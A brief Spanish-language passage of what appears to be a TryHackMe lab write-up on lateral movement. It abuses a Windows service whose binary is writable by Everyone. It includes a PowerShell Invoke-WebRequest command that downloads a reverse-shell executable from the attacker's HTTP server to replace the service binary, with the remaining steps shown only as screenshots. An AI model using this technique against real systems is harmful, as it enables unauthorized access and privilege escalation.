<h2>Movimiento Lateral</h2>
<h3>Service Abuse</h3>
Si investigamos los servicios, podemos ver lo siguiente:

![[Pasted image 20260922151938.png]]

Aquí podemos ver que el servicio `THMSvc` corre bajo la cuenta de `svcadmin`, y con `icacls` podemos ver que todo el mundo (`Everyone`) tiene control completo (`F`). Podemos usarlo para obtener una reverse shell de la siguiente manera.

![[Pasted image 20260922152339.png]]

Creamos una backdoor en formato exe para windows y abrimos un servidor HTTP para descargarlo desde PowerShell:

![[Pasted image 20260922152539.png]]

```powershell
Invoke-WebRequest -Uri http://IP:8000/rev-svc.exe -OutFile C:\Windows\THMSVC\svc.exe
```

Una vez copiada la shell, vamos a dar acceso total a todo el mundo con `icacls`:

![[Pasted image 20260922152745.png]]

Ahora empezamos un listener en nuestra máquina y arrancamos el servicio.

![[Pasted image 20260922152941.png]]
